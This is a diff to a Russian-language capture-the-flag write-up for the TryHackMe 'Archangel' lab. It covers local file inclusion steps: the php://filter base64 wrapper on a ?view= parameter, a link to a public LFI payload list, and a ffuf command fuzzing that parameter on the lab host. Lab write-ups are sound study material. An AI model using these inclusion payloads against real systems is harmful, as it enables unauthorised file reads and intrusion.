@@ -41,7 +41,7 @@ ffuf -w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-11000
 # LFI to RCE
 
 ![Archangel](https://raw.githubusercontent.com/GooseGusevich/Tryhackme/refs/heads/main/Archangel/screenshots/20250420015917.png)
-Контроль это иллюзия)) Интересный параметр ?view=
+>Контроль это иллюзия)) Интересный параметр ?view=
 ![Archangel](https://raw.githubusercontent.com/GooseGusevich/Tryhackme/refs/heads/main/Archangel/screenshots/20250420020620.png)
 php://filter/convert.base64-encode/resource=
 
@@ -73,6 +73,9 @@ echo "PD9waHAgZWNobyAnQ29udHJvbCBpcyBhbiBpbGx1c2lvbic7ID8+Cg==" |base64 -d
 ```
 
 Посмотрев исходник делаю вывод что ../.. фильтруется для path treversal.Буду использовать словарь и  начинать с конечной точки /var/www/html/development_testing
+```
+https://raw.githubusercontent.com/emadshanab/LFI-Payload-List/refs/heads/master/LFI%20payloads.txt
+```
 
 ```
 ffuf -w LFI\ payloads.txt:FFUZ -u http://mafialive.thm/test.php?view=/var/www/html/development_testing/FFUZ -ic -c -fs 286,310
